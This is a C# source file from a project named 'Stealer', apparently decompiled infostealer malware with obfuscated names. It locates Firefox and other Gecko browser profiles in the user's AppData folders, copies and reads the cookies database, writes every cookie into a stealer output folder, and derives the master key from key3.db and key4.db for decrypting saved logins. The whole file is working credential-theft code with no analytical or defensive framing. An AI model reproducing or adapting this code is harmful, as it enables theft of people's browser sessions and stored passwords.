using System;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Stealer;

internal class bGNskvyyGANfxD
{
	public static int count = 0;

	public static int count_cookies = 0;

	public static List<string> domains = new List<string>();

	public static List<string> Cookies_Gecko = new List<string>();

	public static List<string> passwors = new List<string>();

	public static List<string> credential = new List<string>();

	public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");

	public static readonly string TempDirectory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");

	public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");

	public static readonly byte[] Key4MagicNumber = new byte[16]
	{
		248, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		0, 0, 0, 0, 0, 1
	};

	public static List<string> GeckoBrowsers = new List<string>();

	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		List<string> list = new List<string>();
		if (files != null && files.Length != 0 && level <= maxLevel)
		{
			try
			{
				string[] directories = Directory.GetDirectories(baseDirectory);
				foreach (string path in directories)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag = false;
						for (int j = 0; j < files2.Length; j++)
						{
							if (flag)
							{
								break;
							}
							for (int k = 0; k < files.Length; k++)
							{
								if (flag)
								{
									break;
								}
								string obj = files[k];
								FileInfo fileInfo = files2[j];
								if (obj == fileInfo.Name)
								{
									flag = true;
									list.Add(fileInfo.FullName);
								}
							}
						}
						foreach (string item in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
						{
							if (!list.Contains(item))
							{
								list.Add(item);
							}
						}
						directoryInfo = null;
					}
					catch
					{
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		return list;
	}

	public static void getcookie()
	{
		try
		{
			List<string> list = new List<string>();
			list.AddRange(FindPaths(LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
			list.AddRange(FindPaths(RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
			foreach (string item in list)
			{
				string fullName = new FileInfo(item).Directory!.FullName;
				string browser_name = (item.Contains(RoamingAppData) ? prbn(fullName) : plbn(fullName));
				string name = GetName(fullName);
				CookMhn(fullName, browser_name, name);
				string text = "";
				foreach (string item2 in Cookies_Gecko)
				{
					text += item2;
				}
				if (text != "")
				{
					File.AppendAllText(Help.path_stealer + "Browsers\\Cookies\\[Mozilla][cookie].txt", text);
				}
			}
		}
		catch
		{
		}
	}

	private static string GetName(string path)
	{
		try
		{
			return path.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries)[^1];
		}
		catch
		{
		}
		return "None";
	}

	public static string CreateTempCopy(string filePath)
	{
		string text = CreateTempPath();
		File.Copy(filePath, text, overwrite: true);
		return text;
	}

	public static string CreateTempPath()
	{
		return Path.Combine(TempDirectory, "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode() + Thread.CurrentThread.ManagedThreadId);
	}

	public static void CookMhn(string profile, string browser_name, string profile_name)
	{
		try
		{
			string filePath = Path.Combine(profile, "cookies.sqlite");
			CNT cNT = new CNT(CreateTempCopy(filePath));
			cNT.ReadTable("moz_cookies");
			int i;
			for (i = 0; i < cNT.RowLength; i++)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						domains.Add(cNT.ParseValue(i, "host").Trim());
						Cookies_Gecko.Add(cNT.ParseValue(i, "host").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "path").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "expiry").Trim() + "\t" + cNT.ParseValue(i, "name").Trim() + "\t" + cNT.ParseValue(i, "value") + Environment.NewLine);
						tBBjEnntmoNlKq.count++;
					}
					catch
					{
					}
				});
				thread.Start();
				cDFkBrvXKxXwYB.threads.Add(thread);
			}
		}
		catch (Exception)
		{
		}
	}

	private static byte[] p4k(string file)
	{
		byte[] result = new byte[24];
		try
		{
			if (!File.Exists(file))
			{
				return result;
			}
			CNT cNT = new CNT(file);
			cNT.ReadTable("metaData");
			string s = cNT.ParseValue(0, "item1");
			string s2 = cNT.ParseValue(0, "item2)");
			Gecko4 gecko = Gecko1.Create(Encoding.Default.GetBytes(s2));
			byte[] objectData = gecko.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
			byte[] objectData2 = gecko.Objects[0].Objects[1].ObjectData;
			Gecko8 gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
			gecko2.method_0();
			Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2);
			cNT.ReadTable("nssPrivate");
			int rowLength = cNT.RowLength;
			string s3 = string.Empty;
			for (int i = 0; i < rowLength; i++)
			{
				if (cNT.ParseValue(i, "a102") == Encoding.Default.GetString(Key4MagicNumber))
				{
					s3 = cNT.ParseValue(i, "a11");
					break;
				}
			}
			Gecko4 gecko3 = Gecko1.Create(Encoding.Default.GetBytes(s3));
			objectData = gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
			objectData2 = gecko3.Objects[0].Objects[1].ObjectData;
			gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
			gecko2.method_0();
			result = Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2, PaddingMode.PKCS7));
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	private static byte[] p3k(string file)
	{
		byte[] array = new byte[24];
		try
		{
			if (!File.Exists(file))
			{
				return array;
			}
			new DataTable();
			Gecko9 berkeleyDB = new Gecko9(file);
			Gecko7 gecko = new Gecko7(vbv(berkeleyDB, (string x) => x.Equals("password-check")));
			string hexString = vbv(berkeleyDB, (string x) => x.Equals("global-salt"));
			Gecko8 gecko2 = new Gecko8(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), ConvertHexStringToByteArray(gecko.EntrySalt));
			gecko2.method_0();
			Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, ConvertHexStringToByteArray(gecko.Passwordcheck));
			Gecko4 gecko3 = Gecko1.Create(ConvertHexStringToByteArray(vbv(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
			Gecko8 gecko4 = new Gecko8(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
			gecko4.method_0();
			Gecko4 gecko5 = Gecko1.Create(Gecko1.Create(Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko4.DataKey, gecko4.DataIV, gecko3.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
			if (gecko5.Objects[0].Objects[3].ObjectData.Length <= 24)
			{
				array = gecko5.Objects[0].Objects[3].ObjectData;
				return array;
			}
			Array.Copy(gecko5.Objects[0].Objects[3].ObjectData, gecko5.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
			return array;
		}
		catch (Exception)
		{
			return array;
		}
	}

	public static byte[] ConvertHexStringToByteArray(string hexString)
	{
		if (hexString.Length % 2 != 0)
		{
			throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[1] { hexString }));
		}
		byte[] array = new byte[hexString.Length / 2];
		for (int i = 0; i < array.Length; i++)
		{
			string s = hexString.Substring(i * 2, 2);
			array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
		}
		return array;
	}

	private static string vbv(Gecko9 berkeleyDB, Func<string, bool> predicate)
	{
		string text = string.Empty;
		try
		{
			foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
			{
				if (predicate(key.Key))
				{
					text = key.Value;
				}
			}
		}
		catch (Exception)
		{
		}
		return text.Replace("-", string.Empty);
	}

	private static string prbn(string profilesDirectory)
	{
		string text = string.Empty;
		try
		{
			string[] array = profilesDirectory.Split(new string[1] { "AppData\\Roaming\\" }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
		}
		catch (Exception)
		{
		}
		return text.Replace(" ", string.Empty);
	}

	private static string plbn(string profilesDirectory)
	{
		string text = string.Empty;
		try
		{
			string[] array = profilesDirectory.Split(new string[1] { "AppData\\Local\\" }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
		}
		catch (Exception)
		{
		}
		return text.Replace(" ", string.Empty);
	}
}
